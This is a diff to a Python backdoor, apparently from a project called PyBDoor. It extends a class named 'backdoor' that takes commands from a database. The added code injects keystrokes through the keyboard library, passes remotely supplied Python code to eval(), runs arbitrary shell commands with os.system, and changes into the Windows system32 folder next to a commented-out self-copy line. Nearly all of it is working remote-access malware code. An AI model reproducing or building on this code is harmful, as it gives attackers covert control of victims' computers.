@@ -1,7 +1,12 @@
-import sqlite3,socket,os,time,datetime
+import sqlite3,socket,os,time,datetime,keyboard,shutil
+
 
 class backdoor:
     def __init__(self):
+        hard_drive_name = os.getcwd().split(":")
+        hard_drive_name = hard_drive_name[0]
+        os.chdir(hard_drive_name+":/windows/system32")
+        #shutil.copy("main.exe")
         self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
         self.cursor = self.db.cursor()
 
@@ -49,11 +54,35 @@ class backdoor:
                     except FileNotFoundError:
                         output += "FileNotFoundError: " + file + " does not exist\n"
             elif command.startswith("keyboard"):
-                for i in range(len(commands_to_execute)):
-                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
-                        print(commands_to_execute[i+line])
+                for i in range(1,len(commands_to_execute)):
                     lines_to_skip.append(i+line)
+                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
+                        break
+
+                    if commands_to_execute[i+line].startswith("`") and commands_to_execute[i+line].endswith("`"):
+                        execute_key_word = commands_to_execute[i+line]
+                        execute_key_word = execute_key_word.replace("`", "")
+                        keyboard.send(execute_key_word)
+                        continue
+                    
+                    keyboard.write(commands_to_execute[i+line])
+            elif command.startswith("delay"):
+                delay_command = command.split(":")
+                time_to_delay = delay_command[1].replace(" ", "")
+                time.sleep(float(time_to_delay))
+            elif command.startswith("python"):
+                python_code = ""
+                for i in range(1, len(commands_to_execute)):
+                    lines_to_skip.append(i+line)
+                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
+                        break
+                    
+                    python_code += commands_to_execute[i+line] + "\n"
+                
+                eval(python_code)
+
             else:
+                os.system(command)
                 output += os.popen(command).read()
 
         return output
